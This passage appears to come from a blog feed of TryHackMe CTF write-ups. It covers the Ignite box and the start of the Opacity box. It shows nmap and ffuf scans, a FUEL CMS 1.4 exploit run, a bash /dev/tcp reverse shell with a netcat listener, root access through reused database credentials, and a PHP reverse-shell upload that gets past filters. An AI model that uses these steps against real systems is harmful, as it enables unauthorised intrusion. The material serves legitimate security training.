&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░▄██████████████████▄░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░█░░░░░░░░░░░░█░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░▄▄▄▄▄▄▄▄░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░▀▄░░░░▄▀░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░░░▀▀▀▀░░░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█▌░█░▀██████████████████▀░█░▐█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█░░█░████████████░░░░░██░░█░░█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█░░█░░░░░░░░░░░░░░░▄░░░░░░█░░█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░▀█▄█░░░▐█▌░░░░░░░▄███▄░██░█▄█▀░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░▀█░░█████░░░░░░░░░░░░░░░█▀░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░░░▐█▌░░░░░░░░░▄██▄░░░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░░░░░░░░░░░░░░▐████▌░░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░▄▄▄░▄▄▄░░░░░░░▀██▀░░░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░▀██████████████████████▀░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░▐██░░░░░░░░░░░░██▌░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Secret project number: 211243A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Name opbject: BMO
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rol object: Spy
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">In case of emergency use resetcode: tryhackme{Th1s1s4c0d3F0rBM0}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Good job on getting this code!!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">You solved all the puzzles and tried harder to the max.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">If you liked this CTF, give a shout out to @n0w4n.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Ignite Writeup THM</title><link>https://simonefelici.github.io/p/ignite-writeup-thm/</link><pubDate>Wed, 10 Jan 2024 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/ignite-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1546182208-1e70985e2bf3?q=80&amp;w=2592&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post Ignite Writeup THM" />&lt;p>I am going to start with a nmap scna:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sC -sV 10.10.10.167
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-05 11:40 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.10.167
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.057s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">999&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.18 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Welcome to FUEL CMS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-robots.txt: &lt;span class="m">1&lt;/span> disallowed entry
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_/fuel/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.18 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 13.67 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We see that it has a web page running on “FUEL CMS”&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Ignite-writeup-THM/main/8a3dca11-ee82-426e-a7dc-155184a6b3cf_Export-dee501f9-607d-4822-af96-36e7c2ca8801/Ignite%2088fddc3b17754ab58e830bf5d61a5987/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>We see that it’s running version 1.4 which is vulnerable.&lt;/p>
&lt;p>From the nmap scan we also know that it has the robots.txt and fuel directories:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">User-agent: *
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /fuel/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Ignite-writeup-THM/main/8a3dca11-ee82-426e-a7dc-155184a6b3cf_Export-dee501f9-607d-4822-af96-36e7c2ca8801/Ignite%2088fddc3b17754ab58e830bf5d61a5987/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Now I am going to use an exploit that works with fuel cms 1.4:&lt;/p>
&lt;p>&lt;a class="link" href="https://www.exploit-db.com/exploits/50477" target="_blank" rel="noopener"
>https://www.exploit-db.com/exploits/50477&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 50477.py -u http://10.10.10.167/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span>Connecting...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter Command &lt;span class="nv">$whoami&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemwww-data
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Ok now I am going to start a proper reverse shell.&lt;/p>
&lt;p>&lt;code>bash -i &amp;gt;&amp;amp; /dev/tcp/10.11.65.91/4444 0&amp;gt;&amp;amp;1&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.11.65.91&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.113.174&lt;span class="o">]&lt;/span> &lt;span class="m">34452&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/sh: 0: can&lt;span class="err">&amp;#39;&lt;/span>t access tty&lt;span class="p">;&lt;/span> job control turned off
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>From there I just searched the web directory, and found the config folder.&lt;/p>
&lt;p>In there there was a file named database.php, which contains the root credentials&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">su root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@ubuntu:/var/www/html/fuel/application/config# whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Opacity Writeup THM</title><link>https://simonefelici.github.io/p/opacity-writeup-thm/</link><pubDate>Mon, 08 Jan 2024 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/opacity-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1596703720229-1f8fbb8daae5?q=80&amp;w=2574&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post Opacity Writeup THM" />&lt;p>I am going to start with a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sC -sV 10.10.163.225
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-05 09:11 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.163.225
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.057s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">996&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">3072&lt;/span> 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.41 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-cookie-flags:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> /:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> PHPSESSID:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ httponly flag not &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-title: Login
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Requested resource was login.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.41 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Samba smbd 4.6.2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open netbios-ssn Samba smbd 4.6.2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OS: Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_nbstat: NetBIOS name: OPACITY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span class="o">(&lt;/span>unknown&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-time:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> date: 2024-01-05T14:12:03
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ start_date: N/A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-security-mode:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> 3:1:1:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Message signing enabled but not required
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 19.04 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now we know that it runs HTTP and SAMBA,&lt;/p>
&lt;p>first let’s see what’s in the web page:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Opacity-writeup-THM/main/099e4dcc-8d66-4a36-8ebc-076e03053aef_Export-837ad346-3d23-4d4a-9c1e-e576658a205a/Opacity%200ac982ae7c05472f984b5712f3032562/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>We can see that there is a login page.&lt;/p>
&lt;p>But there are other directories:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.163.225/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.163.225/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6221ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6475ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cloud &lt;span class="o">[&lt;/span>Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">css &lt;span class="o">[&lt;/span>Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 2377ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">server-status &lt;span class="o">[&lt;/span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 56ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">327&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:46&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The cloud one could let us upload a reverse shell:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Opacity-writeup-THM/main/099e4dcc-8d66-4a36-8ebc-076e03053aef_Export-837ad346-3d23-4d4a-9c1e-e576658a205a/Opacity%200ac982ae7c05472f984b5712f3032562/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>We need to start our listener with a revshell.php, and upload the php code like that to avoid the security measurements:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Opacity-writeup-THM/main/099e4dcc-8d66-4a36-8ebc-076e03053aef_Export-837ad346-3d23-4d4a-9c1e-e576658a205a/Opacity%200ac982ae7c05472f984b5712f3032562/Untitled%202.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>So we got the shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
